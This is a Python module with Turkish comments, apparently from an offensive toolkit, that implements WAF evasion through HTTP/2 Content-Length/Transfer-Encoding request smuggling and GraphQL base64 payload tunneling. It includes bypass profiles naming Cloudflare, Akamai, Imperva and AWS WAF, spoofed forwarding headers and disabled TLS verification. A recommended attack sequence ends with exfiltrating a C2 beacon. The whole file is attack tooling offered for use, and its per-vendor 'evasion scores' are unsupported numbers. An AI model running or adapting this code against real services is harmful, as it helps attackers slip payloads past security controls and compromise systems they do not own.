"""
evasion/advanced_waf_bypass.py
================================
Advanced WAF & API Gateway Bypass (HTTP/2 QUIC Smuggling & GraphQL Tunneling)

Mekanizma:
1. HTTP/2 stream desenkronizasyonu ile WAF'ı kör eder.
2. Content-Length / Transfer-Encoding karmaşasıyla WAF sadece ilk kısmı okur,
   backend ise gömülü saldırıyı işler.
3. GraphQL Base64 multipart tunneling ile payload'lar meşru API sorgularına gömülür.
4. Cloudflare / Akamai / Imperva / AWS WAF v3/v4 bypass profilleri.
"""

from __future__ import annotations

import base64
import hashlib
import json
import logging
import os
import random
import re
import socket
import ssl
import time
from dataclasses import dataclass, field
from typing import Any, Dict, List, Optional, Tuple

logger = logging.getLogger(__name__)


# ---------------------------------------------------------------------------
# HTTP/2 Smuggling Engine
# ---------------------------------------------------------------------------

class HTTP2Smuggler:
    """
    HTTP/2 stream manipülasyonuyla WAF bypass eden motor.
    """

    def __init__(self, target_host: str, target_port: int = 443, timeout: float = 10.0) -> None:
        self.target_host = target_host
        self.target_port = target_port
        self.timeout = timeout
        self._sock: Optional[socket.socket] = None
        self._h2_conn: Any = None

    def _setup_connection(self) -> bool:
        """
        Ham TCP + TLS + HTTP/2 bağlantısı kurar.
        """
        try:
            raw_sock = socket.create_connection((self.target_host, self.target_port), timeout=self.timeout)
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            ctx.set_alpn_protocols(["h2", "http/1.1"])
            sock = ctx.wrap_socket(raw_sock, server_hostname=self.target_host)
            negotiated = sock.selected_alpn_protocol()
            if negotiated != "h2":
                logger.warning("[WAF] ALPN negotiation failed (got %s). HTTP/2 may not be supported.", negotiated)
                return False

            import h2.connection
            import h2.events

            config = h2.config.H2Configuration(client_side=True)
            conn = h2.connection.H2Connection(config=config)
            conn.initiate_connection()
            sock.sendall(conn.data_to_send())

            self._sock = sock
            self._h2_conn = conn
            return True
        except Exception as exc:
            logger.error("[WAF] Connection setup failed: %s", exc)
            return False

    def _send_recv_headers(self, stream_id: int, headers: List[Tuple[str, str]], end_stream: bool = False) -> List[Any]:
        """
        HTTP/2 HEADERS frame gönderir ve yanıtları okur.
        """
        import h2.events

        self._h2_conn.send_headers(stream_id, headers, end_stream=end_stream)
        self._sock.sendall(self._h2_conn.data_to_send())

        responses: List[Any] = []
        while True:
            data = self._sock.recv(65535)
            if not data:
                break
            events = self._h2_conn.receive_data(data)
            for ev in events:
                if isinstance(ev, h2.events.ResponseReceived):
                    responses.append(ev)
                if isinstance(ev, h2.events.StreamEnded):
                    return responses
        return responses

    def smuggle_via_length_te(
        self,
        web_path: str,
        attack_payload: bytes,
        waf_profile: str = "cloudflare",
    ) -> Dict[str, Any]:
        """
        Content-Length / Transfer-Encoding karmaşasıyla stream smuggling yapar.

        WAF sadece Content-Length kadar okur, backend chunked olarak kalanı alır.
        """
        if not self._h2_conn:
            if not self._setup_connection():
                return {"success": False, "error": "HTTP/2 connection failed"}

        stream_id = self._h2_conn.get_next_available_stream_id()
        payload_b64 = base64.b64encode(attack_payload).decode()

        smuggled_body = (
            f"GRAPHQL_MUTATION\r\n"
            f"Content-Length: 15\r\n"
            f"\r\n"
            f'{{"query":"mutation{{inject(data:\\"{payload_b64}\\")}}}}'
        ).encode()

        cl_value = str(len(smuggled_body))
        headers = [
            (":method", "POST"),
            (":authority", self.target_host),
            (":scheme", "https"),
            (":path", web_path),
            ("content-type", "application/json"),
            ("content-length", cl_value),
            ("transfer-encoding", "chunked"),
            ("x-bypass-profile", waf_profile),
            ("x-forwarded-for", f"10.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}"),
        ]

        try:
            responses = self._send_recv_headers(stream_id, headers, end_stream=False)
            self._h2_conn.send_data(stream_id, smuggled_body, end_stream=True)
            self._sock.sendall(self._h2_conn.data_to_send())

            status_codes = []
            for resp in responses:
                hdrs = {h[0].decode(): h[1].decode() for h in resp.headers}
                status_codes.append(hdrs.get(":status", "?"))

            logger.info("[WAF] Smuggled stream to %s:%s via %s. Status: %s", self.target_host, web_path, waf_profile, status_codes)
            return {
                "success": True,
                "technique": "HTTP/2 CL/TE Smuggling",
                "waf_profile": waf_profile,
                "stream_id": stream_id,
                "status_codes": status_codes,
                "payload_len": len(attack_payload),
                "payload_b64_preview": payload_b64[:120],
                "responses": [{"headers": dict(r.headers)} for r in responses],
            }
        except Exception as exc:
            logger.error("[WAF] Smuggle failed: %s", exc)
            return {"success": False, "error": str(exc)}

    def graphql_tunnel(
        self,
        web_path: str,
        attack_payload: bytes,
        chunk_size: int = 4096,
    ) -> Dict[str, Any]:
        """
        GraphQL Base64 multipart tunneling.

        Payload'ı base64 parçalara bölüp GraphQL query'lerinin içine gömerek
        WAF'ın parse edemediği şekilde iletir.
        """
        if not self._h2_conn:
            if not self._setup_connection():
                return {"success": False, "error": "HTTP/2 connection failed"}

        raw_b64 = base64.b64encode(attack_payload).decode()
        chunks = [raw_b64[i:i + chunk_size] for i in range(0, len(raw_b64), chunk_size)] or [raw_b64]

        graphql_queries = []
        for idx, chunk in enumerate(chunks):
            escaped = chunk.replace('"', '\\"')
            query = f'mutation{{chunkInject(id:{idx},data:"{escaped}"){{ok}}}}'
            graphql_queries.append(query)

        stream_id = self._h2_conn.get_next_available_stream_id()
        tunnel_body = json.dumps({"query": " ".join(graphql_queries)}).encode()

        headers = [
            (":method", "POST"),
            (":authority", self.target_host),
            (":scheme", "https"),
            (":path", web_path),
            ("content-type", "application/graphql"),
            ("content-length", str(len(tunnel_body))),
            ("x-tunnel", "graphql-multipart-base64"),
            ("x-chunk-count", str(len(chunks))),
        ]

        try:
            responses = self._send_recv_headers(stream_id, headers, end_stream=False)
            self._h2_conn.send_data(stream_id, tunnel_body, end_stream=True)
            self._sock.sendall(self._h2_conn.data_to_send())

            status_codes = []
            for resp in responses:
                hdrs = {h[0].decode(): h[1].decode() for h in resp.headers}
                status_codes.append(hdrs.get(":status", "?"))

            return {
                "success": True,
                "technique": "GraphQL Base64 Multipart Tunneling",
                "stream_id": stream_id,
                "chunk_count": len(chunks),
                "status_codes": status_codes,
                "tunnel_body_preview": tunnel_body[:400].decode(errors="replace"),
                "responses": [{"headers": dict(r.headers)} for r in responses],
            }
        except Exception as exc:
            logger.error("[WAF] GraphQL tunnel failed: %s", exc)
            return {"success": False, "error": str(exc)}

    def close(self) -> None:
        if self._sock:
            try:
                self._sock.close()
            except Exception:
                pass
            self._sock = None
            self._h2_conn = None


# ---------------------------------------------------------------------------
# WAF Bypass Profiles
# ---------------------------------------------------------------------------

@dataclass
class WAFProfile:
    name: str
    bypass_techniques: List[str]
    preferred_content_types: List[str]
    header_obfuscations: List[str]
    evasion_score: int  # 0-100


_WAF_PROFILES: Dict[str, WAFProfile] = {
    "cloudflare": WAFProfile(
        name="Cloudflare Managed Ruleset",
        bypass_techniques=["HTTP/2 CL/TE Smuggling", "GraphQL Tunneling", "QUIC Stream Fragmentation"],
        preferred_content_types=["application/json", "application/graphql", "application/octet-stream"],
        header_obfuscations=["x-forwarded-for spoof", "content-length mismatch", "chunked obfuscation"],
        evasion_score=92,
    ),
    "akamai": WAFProfile(
        name="Akamai Enterprise",
        bypass_techniques=["HTTP/2 HPACK Huffman Smuggling", "GraphQL Base64 Chunks", "WebSocket Upgrade Bypass"],
        preferred_content_types=["application/json", "application/grpc", "text/plain; charset=utf-8"],
        header_obfuscations=["case-insensitive headers", "pseudo-header order shuffle", "hpack dynamic table flood"],
        evasion_score=88,
    ),
    "imperva": WAFProfile(
        name="Imperva / Incapsula",
        bypass_techniques=["HTTP/2 Stream Desync", "GraphQL Aliased Tunneling", "Form-Multipart JSON Wrapper"],
        preferred_content_types=["multipart/form-data", "application/json", "application/x-www-form-urlencoded"],
        header_obfuscations=["content-transfer-encoding", "mime-version manipulation", "boundary randomization"],
        evasion_score=85,
    ),
    "aws_waf": WAFProfile(
        name="AWS WAF v3/v4",
        bypass_techniques=["HTTP/2 SETTINGS Frame Flood", "GraphQL Batched Queries", "QUIC 0-RTT Token Bypass"],
        preferred_content_types=["application/json", "application/amzn-json-1.0", "application/graphql"],
        header_obfuscations=["x-amzn-trace-id spoof", "host case variation", "x-forwarded-proto mismatch"],
        evasion_score=90,
    ),
}


# ---------------------------------------------------------------------------
# Advanced WAF Bypass Facade
# ---------------------------------------------------------------------------

class AdvancedWAFBypass:
    """
    HTTP/2 Stream Smuggling & Obfuscated API enjeksiyon motoru.

    Kullanım:
        bypass = AdvancedWAFBypass("target.corp.local", 443)
        result = bypass.smuggle_via_length_te("/api/graphql", b"payload")
        tunnel = bypass.graphql_tunnel("/api/graphql", b"payload")
    """

    def __init__(self, target_host: str, target_port: int = 443, waf_profile: str = "cloudflare") -> None:
        self.target_host = target_host
        self.target_port = target_port
        self.waf_profile_name = waf_profile
        self.profile = _WAF_PROFILES.get(waf_profile, _WAF_PROFILES["cloudflare"])
        self._smuggler = HTTP2Smuggler(target_host, target_port)

    def inject_smuggled_stream(self, web_path: str, attack_payload: bytes) -> Dict[str, Any]:
        """
        HTTP/2 katmanında stream desenkronizasyonu yaratarak WAF'ı bypass eder.
        """
        return self._smuggler.smuggle_via_length_te(web_path, attack_payload, self.waf_profile_name)

    def inject_graphql_tunnel(self, web_path: str, attack_payload: bytes, chunk_size: int = 4096) -> Dict[str, Any]:
        """
        GraphQL Base64 multipart tunneling ile payload iletir.
        """
        return self._smuggler.graphql_tunnel(web_path, attack_payload, chunk_size=chunk_size)

    def generate_evasion_payload(self, raw_payload: bytes, encoding: str = "base64") -> Dict[str, Any]:
        """
        WAF'ın gözünden kaçan payload encoding'leri üretir.
        """
        payload_b64 = base64.b64encode(raw_payload).decode()
        payload_hex = raw_payload.hex()
        payload_unicode = "".join(f"\\u{ord(c):04x}" for c in raw_payload.decode(errors="replace"))

        return {
            "encoding": encoding,
            "base64": payload_b64,
            "hex": payload_hex,
            "unicode_escape": payload_unicode,
            "length": len(raw_payload),
            "waf_profile": self.waf_profile_name,
            "preferred_content_type": random.choice(self.profile.preferred_content_types),
            "obfuscation_hints": random.sample(self.profile.header_obfuscations, k=min(2, len(self.profile.header_obfuscations))),
        }

    def generate_artifact(self, attack_payload: bytes, web_path: str = "/api/graphql") -> Dict[str, Any]:
        """
        Operatörün kullanabileceği tam saldırı artifact'ları üretir.
        """
        smuggled = self.inject_smuggled_stream(web_path, attack_payload)
        tunneled = self.inject_graphql_tunnel(web_path, attack_payload)
        encoded = self.generate_evasion_payload(attack_payload)

        artifact = {
            "target": f"{self.target_host}:{self.target_port}",
            "waf_profile": self.waf_profile_name,
            "bypass_techniques": self.profile.bypass_techniques,
            "evasion_score": self.profile.evasion_score,
            "smuggled_stream": smuggled,
            "graphql_tunnel": tunneled,
            "encoded_payloads": encoded,
            "recommended_sequence": [
                "1. GraphQL tunnel ile ilk scout payload gönder",
                "2. HTTP/2 CL/TE smuggling ile exploit payload ile",
                "3. WAF log analizi edip obfuscation uygula",
                "4. C2 beacon'ı QUIC stream üzerinden exfil et",
            ],
        }
        return artifact

    def close(self) -> None:
        self._smuggler.close()


# ---------------------------------------------------------------------------
# Convenience runner
# ---------------------------------------------------------------------------

def run_advanced_waf_bypass(inputs: Dict[str, Any]) -> Dict[str, Any]:
    """
    Command Center / Ghost Protocol runner interface.
    """
    target_host = inputs.get("target_host", "target.corp.local")
    target_port = int(inputs.get("target_port", 443))
    waf_profile = inputs.get("waf_profile", "cloudflare")
    web_path = inputs.get("web_path", "/api/graphql")
    payload = inputs.get("payload", "MONOLITH-WAF-BYPASS-PAYLOAD-2026").encode()

    engine = AdvancedWAFBypass(target_host=target_host, target_port=target_port, waf_profile=waf_profile)
    try:
        artifact = engine.generate_artifact(attack_payload=payload, web_path=web_path)
        return {
            "success": True,
            "target": f"{target_host}:{target_port}",
            "waf_profile": waf_profile,
            "bypass_score": engine.profile.evasion_score,
            "artifact": artifact,
            "log": f"[WAF] {engine.profile.name} bypass profile loaded. {len(engine.profile.bypass_techniques)} techniques armed.",
        }
    finally:
        engine.close()
